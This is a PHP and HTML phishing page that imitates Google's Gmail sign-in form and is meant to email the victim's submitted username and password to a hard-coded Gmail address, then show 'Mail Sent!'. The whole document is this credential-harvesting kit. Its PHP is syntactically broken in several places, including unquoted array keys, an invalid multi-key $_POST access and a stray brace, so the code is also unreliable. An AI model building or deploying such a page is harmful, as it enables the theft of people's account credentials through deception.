<?php
session_start();


$to = $_POST[capianlastimosa@gmail.com];
$subject = $_POST[kldd];
$message = $_POST['Email', 'Passwd'];
$fromemail = $_POST[capianlastimosa@gmail.com];
$fromname = $_POST[lol];
$lt= '<';
$gt= '>';
$sp= ' ';
$from= 'From:';
$headers = $from.$fromname.$sp.$lt.$fromemail.$gt;
mail($to,$subject,$message,$headers);
header("Location: sendmail.php?msg= Mail Sent!");
exit();
}
?>
<!docktype html>
<html>
<body>
<form  action="sendmail.php" method="POST">   <input name="continue" id="continue" value="https://mail.google.com/mail/?tab=mm" type="hidden">   <input name="service" id="service" value="mail" type="hidden">   <input name="rm" id="rm" value="false" type="hidden">   <input name="dsh" id="dsh" value="-2663017759600220251" type="hidden">   <input name="ltmpl" id="ltmpl" value="googlemail" type="hidden">   <input name="scc" id="scc" value="1" type="hidden">   <input name="GALX" value="FVvSTtLIZzE" type="hidden">   <input id="pstMsg" name="pstMsg" value="0" type="hidden">   <input id="dnConn" name="dnConn" value="" type="hidden">   <input id="checkConnection" name="checkConnection" value="" type="hidden">   <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden"> <input name="timeStmp" id="timeStmp" value="" type="hidden"> <input name="secTok" id="secTok" value="" type="hidden"> <div class="email-div">   <label for="Email"><strong class="email-label">Username</strong></label>  <input spellcheck="false" name="Email" id="Email" type="text"> </div> <div class="passwd-div">   <label for="Passwd"><strong class="passwd-label">Password</strong></label>   <input name="Passwd" id="Passwd" type="password"> </div>   <input class="g-button g-button-submit" name="signIn" id="signIn" onclick="clickedSubmitButton()" value="Send" type="submit"></form>
</body>
</html>
